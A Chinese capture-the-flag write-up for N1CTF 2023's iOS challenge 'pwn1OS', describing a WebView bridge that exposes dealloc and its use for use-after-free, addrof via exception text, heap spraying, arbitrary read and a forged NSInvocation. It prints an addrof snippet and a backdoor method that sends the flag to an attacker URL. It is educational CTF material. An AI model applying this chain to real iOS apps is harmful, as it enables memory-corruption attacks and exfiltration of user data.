# N1CTF 2023 pwn1OS Writeup

## 题目简述

题目是一款 iOS 应用。它注册 `n1ctf` URL Scheme，接受形如 `n1ctf://web/...?...url=...` 的深链，并用旧版 `UIWebView` 打开攻击者控制的 URL。页面加载后，应用把 `ScriptInterface` 实例注入 JavaScript 全局变量 `n1ctf`。

`+[ScriptInterface isSelectorExcludedFromWebScript:]` 恒定返回 `NO`，因此子类的 Objective-C 方法几乎全部暴露给网页，包括本不应由脚本调用的 `dealloc`。决定性漏洞不是普通 WebView XSS，而是脚本可主动释放原生对象，由此构造 UAF、类型混淆、任意读和伪造 `NSInvocation`。

## 解题过程

### 获取对象地址并布置堆喷

`ScriptInterface.challenge` 的 setter 不做运行时类型检查，而 getter 会访问 `_challenge.owner`。把任意对象写入该属性后再调用 getter，不支持 `owner` 的对象会抛出 Objective-C 异常，错误文本末尾包含 `instance 0x...`。JavaScript 用正则即可得到对象地址：

```javascript
function addrof(obj) {
    n1ctf.$setChallenge_(obj);
    try { n1ctf.$challenge(); }
    catch (e) {
        return /instance (0x[\da-f]+)$/i.exec(e)[1];
    }
}
```

`HTTRequest.addMultiPartData_()` 会把 Base64 解码为 `NSData` 并强引用保存。重复创建固定长度的 `NSData`，就能用完全可控的字节喷射指定大小的 iOS 堆区。

### 将 UAF 变成任意读

创建 `CoreService` 后显式调用 `dealloc()`，JavaScript 包装器仍保存原指针。释放该对象，再用 `NSData` 堆喷占回同一地址，把它伪造成 `NSConcreteData`：伪对象中设置正确的 `isa`、长度 24 和攻击者指定的 `bytes` 指针。

随后对悬空包装器做字符串转换，Foundation 的 `NSData description` 会以十六进制显示所指向的 24 字节，形成重复可用的任意读。利用该原语依次完成：

- 用 `addrof(false)` 与固定类偏移计算 CoreFoundation 和 Foundation 的 slide；
- 读取 `CoreService` 的 `isa`，计算 pwn1OS 主程序基址；
- 读取真实 `NSInvocation` 内的 tagged `NSMethodSignature`；
- 读取 `NSInvocation` 的 `_magic_cookie`，满足 `invoke` 的内部一致性检查。

### 伪造 NSInvocation 调用后门

`CoreService` 初始化时会创建一个 `NSInvocation` 放入 `cancelRequest`；其 `dealloc` 中执行 `[self.cancelRequest invoke]`。应用另有后门类：

```objc
+ (void)getFlag:(NSString *)urlString {
    NSData *flag = [NSData dataWithContentsOfFile:flagPath];
    [NSData dataWithContentsOfURL:
        [NSURL URLWithString:[urlString stringByAppendingString:[flag base64Encoding]]]];
}
```

利用 `N1CTFIntroduction` 的多组强引用属性保存伪调用帧、目标类、选择器 `getFlag:` 和攻击者回连 URL。先让一个正常 `CoreService` 的 `cancelRequest` 指向待伪造的 `N1CTFIntroduction`，再释放该对象并用 `NSData` 堆喷将其占回为伪 `NSInvocation`。伪对象中填入泄漏出的 `NSInvocation` 类地址、方法签名、magic cookie，以及：

```text
target   = BackDoor class
selector = getFlag:
argument = attacker URL string
```

最后对正常 `CoreService` 调用 `dealloc()`。它会向已被类型混淆的 `cancelRequest` 发送 `invoke`，从而执行 `+[BackDoor getFlag:]`，把 Base64 flag 作为 URL 后缀请求到攻击者服务器。附件中的 flag 为：

```text
n1ctf{ad44-928ea1f0-be83}
```

仓库只提供源码，没有官方利用脚本。[首解队伍成员 xia0o0o0o 的完整复现](https://xia0.sh/blog/ios-userland-exploitation-pwn1os-in-n1ctf)提供了特定 iOS 镜像的类偏移和完整 JavaScript；上文已经概括其全部关键原语，实际复现时仍需按目标 dyld shared cache 修正这些版本相关偏移。

## 方法总结

URL Scheme 和 UIWebView 只是把攻击者 JavaScript 引入应用，真正的利用障碍是 Objective-C 原生内存破坏，因此本题归入 Pwn。恒定暴露所有 selector 使 `dealloc` 变成强 UAF 原语；异常文本提供 `addrof`，Base64 `NSData` 提供精确堆喷，`NSConcreteData` 类型混淆提供任意读，最后借 `CoreService` 析构中的 `NSInvocation.invoke` 调用现成后门。桥接层绝不能把对象生命周期方法或未审计的 Objective-C selector 暴露给不可信脚本。
